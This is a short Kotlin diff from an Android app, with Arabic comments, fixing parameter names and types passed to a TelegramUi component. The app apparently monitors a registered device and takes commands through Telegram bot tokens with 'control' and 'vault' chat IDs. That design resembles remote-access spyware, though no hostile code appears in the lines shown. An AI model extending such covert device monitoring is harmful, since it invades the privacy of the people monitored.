@@ -194,14 +194,15 @@ class MainActivity : AppCompatActivity() {
             val monitor = Monitor(this@MainActivity)
             appendLog("• الجهاز المسجل: ${monitor.deviceModel} (${monitor.deviceId})")
 
+            // ✅ التصحيح: تمرير المعاملات بالترتيب الصحيح وبالأنواع الصحيحة
             telegramUi = TelegramUi(
                 context = this@MainActivity,
                 monitor = monitor,
                 activeTokens = config.activeTokens,
                 reserveTokens = config.reserveTokens,
-                controlId = config.controlId,
-                vaultId = config.vaultId,
-                secret = config.secret
+                ctrlId = config.controlId.toString(),   // تحويل Long إلى String
+                vaultId = config.vaultId.toString(),    // تحويل Long إلى String
+                appPassword = config.secret ?: ""       // استخدام secret أو نص فارغ
             )
 
             val ui = telegramUi!!
